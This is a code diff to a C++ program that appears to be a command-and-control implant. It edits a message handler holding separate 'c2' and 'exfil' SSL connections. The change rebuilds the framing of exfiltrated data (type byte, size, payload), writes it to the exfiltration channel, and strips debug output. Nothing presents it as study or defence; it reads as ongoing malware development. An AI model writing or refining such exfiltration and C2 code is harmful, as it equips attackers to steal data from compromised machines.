@@ -3,6 +3,7 @@
 #include <cstdlib>
 #include <cstddef>
 #include <cstdio>
+#include <cstring>
 #include <iostream>
 #include <sstream>
 #include <string>
@@ -163,21 +164,12 @@ void handleMessage(const std::string& msg, SSL* c2_ssl, SSL* exfil_ssl) {
     
     if (exfil_ssl && !exfil_data.empty()) {
         uint32_t payload_size = htonl(static_cast<uint32_t>(exfil_data.size()));
-
-        std::vector<char> buffer;
-        buffer.reserve(5 + exfil_data.size());
-        buffer.push_back(type);
-
         char* size_bytes = reinterpret_cast<char*>(&payload_size);
-        buffer.insert(buffer.end(), size_bytes, size_bytes + 4);
-        buffer.insert(buffer.end(), exfil_data.data(), exfil_data.data() + exfil_data.size());
 
-        //send_all_ssl(exfil_ssl, buffer.data(), buffer.size());
-        std::cout << "Point A" << std::endl;
+        std::string s = std::string(1, type) + std::string("0000") + exfil_data;
+        memcpy(&s[1], size_bytes, 4);
 
-        SSL_write(exfil_ssl, buffer.data(), static_cast<int>(buffer.size()));
-    
-        std::cout << "Point B" << std:endl;
+        SSL_write(exfil_ssl, s.c_str(), s.size());
     }
 }
 
